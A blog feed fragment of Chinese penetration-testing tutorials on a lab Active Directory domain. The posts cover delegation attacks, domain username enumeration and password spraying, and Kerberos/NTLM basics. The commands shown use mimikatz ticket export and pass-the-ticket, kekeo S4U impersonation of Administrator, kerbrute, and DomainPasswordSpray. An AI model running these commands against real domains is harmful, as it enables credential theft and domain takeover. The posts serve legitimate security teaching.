class="line">https://gitee.com/y_project/RuoYi/releases</span><br><span class="line">https://power7089.github.io/2022/08/22/JavaWeb%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AE%9E%E6%88%98%E4%B9%8B%E8%8B%A5%E4%BE%9D%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%EF%BC%8C%E7%BB%86%E8%8A%82%E6%BB%A1%E6%BB%A1%E4%B8%8D%E5%BE%97%E4%B8%8D%E5%A5%BD%E5%A5%BD%E5%AD%A6%E7%9A%84%E4%B8%80%E4%B8%AA%E7%B3%BB%E7%BB%9F/    </span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java代码审计 </tag>
            
            <tag> SQL注入 </tag>
            
            <tag> Shiro反序列化 </tag>
            
            <tag> 任意文件读取 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>域渗透系列-委派攻击(非约束性委派/约束性委派)</title>
      <link href="/2023/01/26/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%B3%BB%E5%88%97-%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/"/>
      <url>/2023/01/26/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%B3%BB%E5%88%97-%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2><p>委派一般出现在域环境中，指将域内用户的权限委派给服务账号，使得服务账号能以用户权限访问域内的其他服务，即假设A用户访问服务B时，服务B拿着A用户的凭证去访问服务C，这个过程称为委派。域内委派主要有三种类型：非约束性委派、约束性委派以及基于资源的约束性委派。本文主要介绍非约束性委派及约束性委派攻击手法。</p><h2 id="二、非约束性委派"><a href="#二、非约束性委派" class="headerlink" title="二、非约束性委派"></a>二、非约束性委派</h2><p>若配置了非约束性委派，服务账户可以获取被委派用户的TGT票据，并将TGT票据缓存到lsass进程中，从而服务账户可使用该TGT票据模拟该用户访问任意服务。在域控中默认配置了非约束性委派。</p><h3 id="查找域中配置非约束性委派的服务账号"><a href="#查找域中配置非约束性委派的服务账号" class="headerlink" title="查找域中配置非约束性委派的服务账号"></a>查找域中配置非约束性委派的服务账号</h3><p>利用 ADfind 寻找域内配置了非约束委派服务账号，<a href="https://www.softpedia.com/get/Programming/Other-Programming-Files/AdFind.shtml">点击下载</a></p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -b &quot;DC=域名前缀,DC=域名后缀&quot; -f &quot;(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; -dn</span><br><span class="line"></span><br><span class="line">AdFind.exe -b &quot;DC=redteam,DC=red&quot; -f &quot;(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; -dn</span><br></pre></td></tr></table></figure></div><p>账户 saulgoodman 配置了非约束性委派 </p><p><a data-fancybox="gallery" data-src="/../images/domain/appoint/image-20230124220444429.png" data-caption="image-20230124220444429"><img src="/../images/domain/appoint/image-20230124220444429.png" alt="image-20230124220444429"></a></p><p>域控下该账户配置如下</p><p><a data-fancybox="gallery" data-src="/../images/domain/appoint/image-20230124223151897.png" data-caption="image-20230124223151897"><img src="/../images/domain/appoint/image-20230124223151897.png" alt="image-20230124223151897"></a></p><h3 id="查找域中配置非约束性委派的主机"><a href="#查找域中配置非约束性委派的主机" class="headerlink" title="查找域中配置非约束性委派的主机"></a>查找域中配置非约束性委派的主机</h3><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -b &quot;DC=域名前缀,DC=域名后缀&quot; -f &quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; -dn</span><br><span class="line"></span><br><span class="line">AdFind.exe -b &quot;DC=redteam,DC=red&quot; -f &quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; -dn</span><br></pre></td></tr></table></figure></div><p>OWA、SQLSERVER-2008 主机配置了非约束性委派</p><p><a data-fancybox="gallery" data-src="/../images/domain/appoint/image-20230124220545872.png" data-caption="image-20230124220545872"><img src="/../images/domain/appoint/image-20230124220545872.png" alt="image-20230124220545872"></a></p><p>域控下配置如下图</p><p><a data-fancybox="gallery" data-src="/../images/domain/appoint/image-20230124223317529.png" data-caption="image-20230124223317529"><img src="/../images/domain/appoint/image-20230124223317529.png" alt="image-20230124223317529"></a></p><h3 id="非约束性委派攻击"><a href="#非约束性委派攻击" class="headerlink" title="非约束性委派攻击"></a>非约束性委派攻击</h3><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">| 环境           | 名称           |</span><br><span class="line">| -------------- | -------------- |</span><br><span class="line">| 域控主机       | owa            |</span><br><span class="line">| 域控管理员     | administrator  |</span><br><span class="line">| 域内成员主机   | sqlserver-2008 |</span><br><span class="line">| 域成员普通账号 | sqlserver      |</span><br><span class="line">| 域名           | redteam.red    |</span><br></pre></td></tr></table></figure></div><p>1、利用 mimikatz 清理域内成员主机票据</p><p><a data-fancybox="gallery" data-src="/../images/domain/appoint/image-20230124224345035.png" data-caption="image-20230124224345035"><img src="/../images/domain/appoint/image-20230124224345035.png" alt="image-20230124224345035"></a></p><p>这是域控未访问主机前的票据，利用 mimikatz 导出，存储在 mimikatz 目录下</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::tickets /export</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/domain/appoint/image-20230124224822348.png" data-caption="image-20230124224822348"><img src="/../images/domain/appoint/image-20230124224822348.png" alt="image-20230124224822348"></a></p><p><a data-fancybox="gallery" data-src="/../images/domain/appoint/image-20230124224959236.png" data-caption="image-20230124224959236"><img src="/../images/domain/appoint/image-20230124224959236.png" alt="image-20230124224959236"></a></p><p>2、在域控机器上模拟管理员账号远程IPC连接域成员主机。当成功访问后，域成员主机的 lsass.exe 内存中就会有域管理员 administrator 的 TGT 票据。</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net use \\域内成员主机名.域名 /user:域管理员账户 密码</span><br><span class="line"></span><br><span class="line">net use \\sqlserver-2008.redteam.red /user:redteam\administrator redteam!@#45</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/domain/appoint/image-20230124225538151.png" data-caption="image-20230124225538151"><img src="/../images/domain/appoint/image-20230124225538151.png" alt="image-20230124225538151"></a></p><p>4、域成员主机再次利用 mimikatz 导出票据，此时多了一个域管理员的票据</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::tickets /export</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/domain/appoint/image-20230124230011442.png" data-caption="image-20230124230011442"><img src="/../images/domain/appoint/image-20230124230011442.png" alt="image-20230124230011442"></a></p><p>5、利用 mimikatz 进行导入票据</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ppt [0;8ddacc]-2-0-60a00000-Administrator@krbtgt-REDTEAM.RED.kirbi# 导入票据</span><br><span class="line">kerberos::list # 查看票据</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/domain/appoint/image-20230124230229053.png" data-caption="image-20230124230229053"><img src="/../images/domain/appoint/image-20230124230229053.png" alt="image-20230124230229053"></a></p><p>6、域内成员主机成功访问域控</p><p><a data-fancybox="gallery" data-src="/../images/domain/appoint/image-20230124230444983.png" data-caption="image-20230124230444983"><img src="/../images/domain/appoint/image-20230124230444983.png" alt="image-20230124230444983"></a></p><h2 id="三、约束性委派"><a href="#三、约束性委派" class="headerlink" title="三、约束性委派"></a>三、约束性委派</h2><p>若配置了约束性委派，服务账号只能获取该用户对指定服务的ST票据，从而只能模拟该用户访问特定的服务。</p><h3 id="查看域内约束性委派的服务账号"><a href="#查看域内约束性委派的服务账号" class="headerlink" title="查看域内约束性委派的服务账号"></a>查看域内约束性委派的服务账号</h3><p>利用 ADfind 寻找域内配置了约束委派服务账号，<a href="https://www.softpedia.com/get/Programming/Other-Programming-Files/AdFind.shtml">点击下载</a></p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -b &quot;DC=域名前缀,DC=域名后缀&quot; -f &quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot; cn distinguishedName msds-allowedtodelegateto</span><br><span class="line"></span><br><span class="line">AdFind.exe -b &quot;DC=redteam,DC=red&quot; -f &quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot; cn distinguishedName msds-allowedtodelegateto</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/domain/appoint/image-20230126105511373.png" data-caption="image-20230126105511373"><img src="/../images/domain/appoint/image-20230126105511373.png" alt="image-20230126105511373"></a></p><p><a data-fancybox="gallery" data-src="/../images/domain/appoint/image-20230126102412371.png" data-caption="image-20230126102412371"><img src="/../images/domain/appoint/image-20230126102412371.png" alt="image-20230126102412371"></a></p><h3 id="约束性委派攻击"><a href="#约束性委派攻击" class="headerlink" title="约束性委派攻击"></a>约束性委派攻击</h3><p>1、已知域控管理员明文，在配置了利用约束性委派的服务的域成员机器上利用kekeo请求TGT服务，获取TGT票据</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tgt::ask /user:约束性委派的服务账号 /domain:域名 /password:约束性委派的服务账号密码</span><br><span class="line"></span><br><span class="line">tgt::ask /user:sqlserver /domain:redteam.red /password:admin2345</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/domain/appoint/image-20230126104927953.png" data-caption="image-20230126104927953"><img src="/../images/domain/appoint/image-20230126104927953.png" alt="image-20230126104927953"></a></p><p><a data-fancybox="gallery" data-src="/../images/domain/appoint/image-20230126105037069.png" data-caption="image-20230126105037069"><img src="/../images/domain/appoint/image-20230126105037069.png" alt="image-20230126105037069"></a></p><p>2、利用请求到的TGT票据，使用S4U协议并伪造administrator身份访问服务。</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tgs::s4u /tgt:请求到的TGT票据 /user:Administrator@域名 /service:cifs/对应的主机名</span><br><span class="line"></span><br><span class="line">tgs::s4u /tgt:TGT_sqlserver@REDTEAM.RED_krbtgt~redteam.red@REDTEAM.RED.kirbi /user:Administrator@redteam.red /service:cifs/owa.redteam.red</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/domain/appoint/image-20230126105818800.png" data-caption="image-20230126105818800"><img src="/../images/domain/appoint/image-20230126105818800.png" alt="image-20230126105818800"></a></p><p>获取到两张ST，一张是cifs&#x2F;owa.redteam.red服务的，另一张是sqlserver服务的</p><p><a data-fancybox="gallery" data-src="/../images/domain/appoint/image-20230126110008259.png" data-caption="image-20230126110008259"><img src="/../images/domain/appoint/image-20230126110008259.png" alt="image-20230126110008259"></a></p><p>3、使用 mimikatz 将票据导入即可访问 cifs&#x2F;owa.redteam.red 服务</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt cifs主机服务票据</span><br><span class="line"></span><br><span class="line">kerberos::ptt TGS_Administrator@redteam.red@REDTEAM.RED_cifs~owa.redteam.red@REDTEAM.RED.kirbi</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/domain/appoint/image-20230126110700172.png" data-caption="image-20230126110700172"><img src="/../images/domain/appoint/image-20230126110700172.png" alt="image-20230126110700172"></a></p><p>未进行约束性委派攻击前不能访问域控</p><p><a data-fancybox="gallery" data-src="/../images/domain/appoint/image-20230126110548968.png" data-caption="image-20230126110548968"><img src="/../images/domain/appoint/image-20230126110548968.png" alt="image-20230126110548968"></a></p><p>进行约束性委派攻击后成功访问域控</p><p><a data-fancybox="gallery" data-src="/../images/domain/appoint/image-20230126110756652.png" data-caption="image-20230126110756652"><img src="/../images/domain/appoint/image-20230126110756652.png" alt="image-20230126110756652"></a></p><h2 id="五、总结"><a href="#五、总结" class="headerlink" title="五、总结"></a>五、总结</h2><p>本文简单阐述了非约束性委派及约束性委派的基本原理及基本的攻击手法，基于资源的约束性委派部分后续有时间再更新。</p><h2 id="六、参考"><a href="#六、参考" class="headerlink" title="六、参考"></a>六、参考</h2><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">https://www.softpedia.com/get/Programming/Other-Programming-Files/AdFind.shtml</span><br><span class="line">https://github.com/gentilkiwi/kekeo</span><br><span class="line">https://github.com/Kevin-Robertson/Powermad</span><br><span class="line">https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1</span><br><span class="line">https://cloud.tencent.com/developer/article/1899592</span><br><span class="line">https://cloud.tencent.com/developer/article/1861371</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      <categories>
          
          <category> 域渗透系列 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 约束性委派 </tag>
            
            <tag> 非约束性委派 </tag>
            
            <tag> 基于资源的约束性委派 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>域渗透系列-域内用户名枚举及密码喷洒</title>
      <link href="/2023/01/24/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%B3%BB%E5%88%97-%E5%9F%9F%E5%86%85%E7%94%A8%E6%88%B7%E5%90%8D%E6%9E%9A%E4%B8%BE%E5%8F%8A%E5%AF%86%E7%A0%81%E5%96%B7%E6%B4%92/"/>
      <url>/2023/01/24/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%B3%BB%E5%88%97-%E5%9F%9F%E5%86%85%E7%94%A8%E6%88%B7%E5%90%8D%E6%9E%9A%E4%B8%BE%E5%8F%8A%E5%AF%86%E7%A0%81%E5%96%B7%E6%B4%92/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2><p>进行域渗透时，我们可以通过枚举域内用户账号然后再利用工具进行密码喷洒，将已有成果最大化，基本原理类似暴力破解，本文主要简述几款工具基本的使用方法。</p><h2 id="二、域内用户名枚举"><a href="#二、域内用户名枚举" class="headerlink" title="二、域内用户名枚举"></a>二、域内用户名枚举</h2><h3 id="Kerbrute"><a href="#Kerbrute" class="headerlink" title="Kerbrute"></a>Kerbrute</h3><p>kerbrute 基于 Go 语言编写的域内用户名枚举及密码喷洒工具。获取域内一主机权限后，整合已收集到的信息或日常收集到的用户名制作成字典，利用kerbrute进行域内进行用户名枚举</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerbrute_windows_amd64.exe userenum --dc 域控IP -d 域名 指定用户名文件.txt</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/domain/user&pass/image-20230124151726168.png" data-caption="image-20230124151726168"><img src="/../images/domain/user&pass/image-20230124151726168.png" alt="image-20230124151726168"></a></p><h3 id="DomainPasswordSpray"><a href="#DomainPasswordSpray" class="headerlink" title="DomainPasswordSpray"></a>DomainPasswordSpray</h3><p>DomainPasswordSpray 是一种用 PowerShell 编写的工具，用于对域用户执行密码喷射攻击。默认情况下，它将自动从域中生成用户列表并排除被禁用和被锁定的用户</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -exec bypass -command &quot;&amp;&#123;import-module .\DomainPasswordSpray.ps1; Get-DomainUserList -RemoveDisabled -RemovePotentialLockouts| Out-File -Encoding ascii userlist.txt &#125;&quot;</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/domain/user&pass/image-20230124155900635.png" data-caption="image-20230124155900635"><img src="/../images/domain/user&pass/image-20230124155900635.png" alt="image-20230124155900635"></a></p><h2 id="三、域内密码喷洒"><a href="#三、域内密码喷洒" class="headerlink" title="三、域内密码喷洒"></a>三、域内密码喷洒</h2><h3 id="Kerbrute-1"><a href="#Kerbrute-1" class="headerlink" title="Kerbrute"></a>Kerbrute</h3><p>指定密码喷洒</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerbrute passwordspray -d 域名 --dc 域控IP 用户名.txt 指定密码（Password123）</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/domain/user&pass/image-20230124163410723.png" data-caption="image-20230124163410723"><img src="/../images/domain/user&pass/image-20230124163410723.png" alt="image-20230124163410723"></a></p><h3 id="DomainPasswordSpray-1"><a href="#DomainPasswordSpray-1" class="headerlink" title="DomainPasswordSpray"></a>DomainPasswordSpray</h3><p>指定UserList进行密码喷洒暴破</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -exec bypass -command &quot;&amp;&#123;import-module .\DomainPasswordSpray.ps1; Invoke-DomainPasswordSpray -UserList username.txt -Password admin!@#45 -Verbose&#125;&quot;</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/domain/user&pass/image-20230124164438885.png" data-caption="image-20230124164438885"><img src="/../images/domain/user&pass/image-20230124164438885.png" alt="image-20230124164438885"></a></p><h3 id="超级弱口令工具"><a href="#超级弱口令工具" class="headerlink" title="超级弱口令工具"></a>超级弱口令工具</h3><p><a data-fancybox="gallery" data-src="/../images/domain/user&pass/image-20230124162831697.png" data-caption="image-20230124162831697"><img src="/../images/domain/user&pass/image-20230124162831697.png" alt="image-20230124162831697"></a></p><h2 id="四、参考"><a href="#四、参考" class="headerlink" title="四、参考"></a>四、参考</h2><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">https://mp.weixin.qq.com/s/3kV9pT0Zxrv8KUKg2N8O4Q</span><br><span class="line">https://github.com/ropnop/kerbrute</span><br><span class="line">https://github.com/dafthack/DomainPasswordSpray</span><br><span class="line">https://github.com/shack2/SNETCracker</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      <categories>
          
          <category> 域渗透系列 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 密码喷洒 </tag>
            
            <tag> 用户枚举 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>域渗透系列-基础知识篇</title>
      <link href="/2023/01/23/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%B3%BB%E5%88%97-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E7%AF%87/"/>
      <url>/2023/01/23/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%B3%BB%E5%88%97-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E7%AF%87/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="一、基本协议"><a href="#一、基本协议" class="headerlink" title="一、基本协议"></a>一、基本协议</h2><h3 id="Kerberos-认证协议"><a href="#Kerberos-认证协议" class="headerlink" title="Kerberos 认证协议"></a>Kerberos 认证协议</h3><p>Kerberos 基于票据的身份认证方式，并非密码认证。客户端想要访问服务端的某个应用必须通过 Kerberos 进行票据身份认证。其主要由客户端（Client）、服务端（Server）、提供认证服务的KDC（Key Distribution Center）三部分组成</p><h3 id="LDAP-协议"><a href="#LDAP-协议" class="headerlink" title="LDAP 协议"></a>LDAP 协议</h3><p>LDAP 的全称是 Lightweight Directory Access Protocol，轻量目录访问协议。 LDAP 约定了 Client 与 Server 之间的信息交互格式、使用的端口号、认证方式等内，通常将信息以树形方式存储，一个对象可以有多个子对象，这样的结构叫作 DIT（目录信息树），大多数WEB应用使用统一身份认证时，通常使用LDAP作为支撑，保证了用户身份认证存储。</p><h3 id="NTLM-认证协议"><a href="#NTLM-认证协议" class="headerlink" title="NTLM 认证协议"></a>NTLM 认证协议</h3><p>NTLM 协议为微软用于Windows身份认证的主要协议之一，NTML 既可以用于工作组中的机器身份验证，也可用于域环境的身份认证。</p><p>NTLM Hash 加密算法，是微软为提高安全性的同时保证兼容性而设计的散列加密算法，基于MD4加密算法进行加密。Windows Vista 和 Windows Server 2008开始，只存储 NTLM Hash。</p><p>NTLM Hash 加密流程为，<strong>用户密码-》十六进制-》Unicode编码-》MD4单向Hash加密</strong></p><p>NTLM Hash 存储位置，用户密码经 NTLM Hash 加密后存储在：<strong>C:\Windwos\system32\config\SAM</strong>，用户输入密码进行认证过程：<strong>用户输入密码-》系统将密码转换为NTLM Hash 与 SAM 文件中的 NTLM Hash 进行比较</strong>。当用户注销、重启、锁屏后，winlogon.exe 显示登录界面（输入框），当winlogon.exe 接收输入后会将密码交给 lsass.exe 进程，lsass.exe 进程会存一份明文密码，然后将明文密码加密成NTLM Hash 与 SAM 文件进行比较认证。这也是我们常听到的利用 mmikatz 从 lsass.exe 进程抓取明文密码或Hash 密码。</p><h2 id="二、域初识"><a href="#二、域初识" class="headerlink" title="二、域初识"></a>二、域初识</h2><h3 id="AD（Active-Directory，活动目录）"><a href="#AD（Active-Directory，活动目录）" class="headerlink" title="AD（Active Directory，活动目录）"></a>AD（Active Directory，活动目录）</h3><p>AD（Active Directory，活动目录）为微软对通用目录服务器数据库的实现。活动目录使用 LDAP 作为其主要访问协议，存储着有关网络中各种对象的信息，如用户账号、计算机账号、组、Kerberos使用的所以有关凭据等，以便管理员和用户查找和使用这些信息。</p><h3 id="ADDS（Active-Directory-Domain-Service，活动目录域服务）"><a href="#ADDS（Active-Directory-Domain-Service，活动目录域服务）" class="headerlink" title="ADDS（Active Directory Domain Service，活动目录域服务）"></a>ADDS（Active Directory Domain Service，活动目录域服务）</h3><p>ADDS（Active Directory Domain Service，活动目录域服务），活动目录可以作为活动目录域服务或活动目录轻型目录服务（ADDS）部署。</p><h3 id="DC（域控制器，Domain-Controller）"><a href="#DC（域控制器，Domain-Controller）" class="headerlink" title="DC（域控制器，Domain Controller）"></a>DC（域控制器，Domain Controller）</h3><p>域控制器中包含了由这个域的账户、密码、属于这个域的计算机等信息构成的数据库。当电脑联入网络时，域控制器首先要鉴别这台电脑是否是属于这个域的，用户使用的登录账号是否存在、密码是否正确。如果以上信息有一样不正确，那么域控制器就会拒绝这个用户从这台电脑登录。不能登录，用户就不能访问服务器上有权限保护的资源，他只能以对等网用户的方式访问Windows共享出来的资源，这样就在一定程度上保护了网络上的资源。</p><h2 id="三、工作组和域"><a href="#三、工作组和域" class="headerlink" title="三、工作组和域"></a>三、工作组和域</h2><h3 id="工作组（work-group）"><a href="#工作组（work-group）" class="headerlink" title="工作组（work group）"></a>工作组（work group）</h3><p>工作组（Work Group），将同一网络下的计算机分成不同的组，如：技术部、财务部、会计部。大部分中小企业会采取工作组的方式对资源进行权限分配和目录共享。优点就是资源可随机和灵活地分布，便于资源共享，缺点就是缺乏集中管理控制的机制，没有集中的统一账号管理，只适合小规模使用。</p><h3 id="域（domain）"><a href="#域（domain）" class="headerlink" title="域（domain）"></a>域（domain）</h3><p>域（Domain）微软为集中管理计算机推出的一种方式，其中域中的所有用户账号、计算机、打印机和其他安全主体都在域控的中央数据库中注册。在域内使用的计算器中，每个用户有一个唯一的用户账号，管理员可以为这些账号分配访问域内资源的权限。可以理解为升级版的工作组。</p><p>单域：所有计算机加入一个域中</p><p>域树：多个域通过建立信任关系组成的集合。一个域管理员只能管理本域的内部，不能访问或者管理其他的域，两个域之间访问需要建立信任关系。域树内父域与子域之间可按需相互进行管理，还可以跨网分配文件，使不同域之间实现网络资源共享与管理。</p><p>域林：域林是指由一个或多个没有形成连续名字空间的域树组成，它与域树最明显的区别就在于域林之间没有形成连续的名字空间，而域树则是由一些具有连续名字空间的域组成。但域林中的所有域树仍共享同一个表结构、配置和全局目录。域林中的所有域树通过 Kerberos 信任关系建立起来，所以每个域树都知道Kerberos信任关系，不同域树可以交叉引用其他域树中的对象。域林都有根域，域林的根域是域林中创建的第一个域，域林中所有域树的根域与域林的根域建立可传递的信任关系。</p><h2 id="四、域信任"><a href="#四、域信任" class="headerlink" title="四、域信任"></a>四、域信任</h2><p>域信任（Domain Trust）是为了解决多域环境下的跨域资源共享问题而诞生的。一个域之间必须拥有信任关系才可以互相访问到对方域内的资源。因此信任工作是通过 Kerberos 协议来完成的，因此也被称为 Kerberos Trust。</p><h2 id="五、本地账号和活动目录账号"><a href="#五、本地账号和活动目录账号" class="headerlink" title="五、本地账号和活动目录账号"></a>五、本地账号和活动目录账号</h2><p>本地账户（Local Acount）存储在本地的服务器上。这些账户可以在本地服务器上分配权限，但只能在该服务器上进行分配。默认的本地账户是内置账户（如Administrator、Guest），在安装Windows时自动创建，无法进行删除。默认的本地账户不提供对网络资源的访问，根据分配给该账户的权限来管理对本地服务器资源的访问。默认的本地账户和后期创建的本地账户都位于“用户”文件夹中。</p><p><a data-fancybox="gallery" data-src="/../images/domain/basics/image-20230118124720467.png" data-caption="image-20230118124720467"><img src="/../images/domain/basics/image-20230118124720467.png" alt="image-20230118124720467"></a></p><h3 id="Administrator"><a href="#Administrator" class="headerlink" title="Administrator"></a>Administrator</h3><p>Windows 安装时自动创建 Administrator 账户，该账户为默认的本地管理员账号，在本地管理员组 Administrators 中，该账户可以完全控制服务器，并根据需要向用户分配用户权限和访问控制权限，每台 Windows 计算机都有该账户，不能作删除或锁定默认的 Administrator 账户，但可重名或禁用它。在更高的 Windows 系统中，Windows默认禁用内置的管理员账户Administrator，并创建管理员组 Administrators 成员的另一本地账户。若想激活 Administrator 账户可以通过管理员权限执行命令：<strong>net user Administrator &#x2F;active:yes</strong></p><h3 id="Guest"><a href="#Guest" class="headerlink" title="Guest"></a>Guest</h3><p>Windows安装过程中创建 Guest 账户，默认禁用。Guest 账户允许在计算机上没有账户的用户临时登录本地服务器或客户端计算机，Guest账户密码默认为空。</p><h3 id="DefaultAcount"><a href="#DefaultAcount" class="headerlink" title="DefaultAcount"></a>DefaultAcount</h3><p>DefaultAcount 称为默认系统管理账户DSMA，该账户在 Windows 10 版本1607和 Windwos Server 2016中引入的内置账户，是一个用户中立账户，可以运行多用户感知或与用户无关的进程，默认禁用。</p><h3 id="WDAGUtilityAccount"><a href="#WDAGUtilityAccount" class="headerlink" title="WDAGUtilityAccount"></a>WDAGUtilityAccount</h3><p>WDAGUtilityAccount 账户为 Windows Defender 应用程序防护方案管理和使用的用户账户，该账户是在 Windows 10 版本 1709 和 Windows Server 2019 中引入的内置账号，默认禁用。</p><h2 id="六、本地组和域组"><a href="#六、本地组和域组" class="headerlink" title="六、本地组和域组"></a>六、本地组和域组</h2><h3 id="本地组"><a href="#本地组" class="headerlink" title="本地组"></a>本地组</h3><p>当计算机安装完成后，自动默认创建本地组，CMD 执行命令 <strong>net localgroup</strong> 可查询本机上的本地组情况。属于本地组的用户具有本地计算机上执行的各种任务的权限和能力。</p><p><a data-fancybox="gallery" data-src="/../images/domain/basics/image-20230118125139516.png" 